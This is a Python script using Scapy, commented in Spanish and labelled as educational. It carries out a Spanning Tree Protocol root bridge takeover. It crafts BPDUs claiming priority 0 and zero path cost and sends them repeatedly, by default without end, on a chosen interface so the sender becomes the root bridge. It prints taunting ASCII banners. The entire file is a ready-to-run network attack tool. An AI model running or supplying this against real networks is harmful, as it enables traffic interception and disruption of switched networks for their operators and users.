### SOLO PARA PROPOSITOS EDUCATIVOS.

#!/usr/bin/env python3

from scapy.all import *
import sys
import argparse
import time
import os

def generate_superior_bpdu(interface, bridge_priority=0, bridge_mac=None):
    """
    Genera un BPDU superior para reclamar el root bridge
    
    STP BPDU Format:
    - Root Bridge ID = Priority (2 bytes) + MAC (6 bytes)
    - Menor prioridad = Root Bridge
    - Priority 0 = Máxima prioridad
    """
    
    # Usar MAC de la interfaz o una personalizada
    if bridge_mac is None:
        bridge_mac = get_if_hwaddr(interface)
    
    # Crear paquete STP/BPDU
    # Destination MAC para STP: 01:80:c2:00:00:00
    dot3 = Dot3(dst="01:80:c2:00:00:00", src=bridge_mac)
    llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    
    # BPDU: Claiming to be Root Bridge with priority 0
    bpdu = STP(
        proto=0,        # Protocol ID
        version=0,      # STP version
        bpdutype=0,     # Configuration BPDU
        bpduflags=0,    # Topology Change flags
        rootid=bridge_priority,  # Root Bridge Priority (0 = highest)
        rootmac=bridge_mac,      # Root Bridge MAC
        pathcost=0,     # Cost to root (0 = we ARE root)
        bridgeid=bridge_priority,  # Our Bridge Priority
        bridgemac=bridge_mac,      # Our Bridge MAC
        portid=0x8001,  # Port ID
        age=0,          # Message Age
        maxage=20,      # Max Age
        hellotime=2,    # Hello Time
        fwddelay=15     # Forward Delay
    )
    
    # Construir paquete completo
    packet = dot3 / llc / bpdu
    return packet

def stp_attack(interface, priority, count, interval):
    """Realiza el ataque STP enviando BPDUs maliciosos"""
    
    print(f"[*] Interfaz: {interface}")
    print(f"[*] Prioridad reclamada: {priority}")
    print(f"[*] BPDUs a enviar: {count if count > 0 else 'INFINITO'}")
    print(f"[*] Intervalo: {interval}s")
    print("-" * 60)
    
    bridge_mac = get_if_hwaddr(interface)
    print(f"[*] MAC del atacante: {bridge_mac}")
    print(f"[*] Reclamando ser ROOT BRIDGE con prioridad {priority}...\n")
    
    sent_count = 0
    
    try:
        if count > 0:
            # Modo limitado
            for i in range(count):
                packet = generate_superior_bpdu(interface, priority, bridge_mac)
                sendp(packet, iface=interface, verbose=0)
                sent_count += 1
                
                print(f"[{i+1}/{count}] BPDU enviado - Claiming ROOT BRIDGE")
                time.sleep(interval)
        else:
            # Modo infinito
            round_num = 1
            while True:
                packet = generate_superior_bpdu(interface, priority, bridge_mac)
                sendp(packet, iface=interface, verbose=0)
                sent_count += 1
                
                print(f"[BPDU #{sent_count}] Claiming ROOT BRIDGE - Ronda {round_num}")
                time.sleep(interval)
                
                if sent_count % 10 == 0:
                    round_num += 1
                    print(f"\n--- Ronda {round_num} ---\n")
                    
    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido por el usuario")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    
    print(f"\n[*] Total BPDUs enviados: {sent_count}")

def main():
    parser = argparse.ArgumentParser(description='STP Root Bridge Attack')
    parser.add_argument('-i', '--interface', required=True, 
                        help='Interfaz de red (ej: eth0)')
    parser.add_argument('-p', '--priority', type=int, default=0,
                        help='Prioridad del bridge (default: 0 = máxima)')
    parser.add_argument('-n', '--number', type=int, default=0,
                        help='Número de BPDUs (default: 0 = infinito)')
    parser.add_argument('-t', '--time', type=float, default=2.0,
                        help='Intervalo entre BPDUs en segundos (default: 2.0)')
    
    args = parser.parse_args()
    
    # Verificar root
    if os.geteuid() != 0:
        print("[!] Ejecuta con: sudo python3 stp_attack.py")
        sys.exit(1)
    
    # Validar prioridad (debe ser múltiplo de 4096 en STP real, pero lo simplificamos)
    if args.priority < 0 or args.priority > 65535:
        print("[!] Prioridad debe estar entre 0 y 65535")
        sys.exit(1)
    
    # OHHHH BOY
    print("\n")
    print("     ██████╗ ██╗  ██╗██╗  ██╗██╗  ██╗██╗  ██╗")
    print("    ██╔═══██╗██║  ██║██║  ██║██║  ██║██║  ██║")
    print("    ██║   ██║███████║███████║███████║███████║")
    print("    ██║   ██║██╔══██║██╔══██║██╔══██║██╔══██║")
    print("    ╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║")
    print("     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝")
    print("")
    print("    ██████╗  ██████╗ ██╗   ██╗")
    print("    ██╔══██╗██╔═══██╗╚██╗ ██╔╝")
    print("    ██████╔╝██║   ██║ ╚████╔╝ ")
    print("    ██╔══██╗██║   ██║  ╚██╔╝  ")
    print("    ██████╔╝╚██████╔╝   ██║   ")
    print("    ╚═════╝  ╚═════╝    ╚═╝   ")
    print("")
    time.sleep(1)
    
    # Realizar ataque
    stp_attack(args.interface, args.priority, args.number, args.time)
    
    # LMFAO
    print("\n")
    print("    ════════════════════════════════════════")
    print("    ██╗     ███╗   ███╗███████╗ █████╗  ██████╗ ")
    print("    ██║     ████╗ ████║██╔════╝██╔══██╗██╔═══██╗")
    print("    ██║     ██╔████╔██║█████╗  ███████║██║   ██║")
    print("    ██║     ██║╚██╔╝██║██╔══╝  ██╔══██║██║   ██║")
    print("    ███████╗██║ ╚═╝ ██║██║     ██║  ██║╚██████╔╝")
    print("    ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ")
    print("    ════════════════════════════════════════")
    print("\n")

if __name__ == "__main__":
    main()
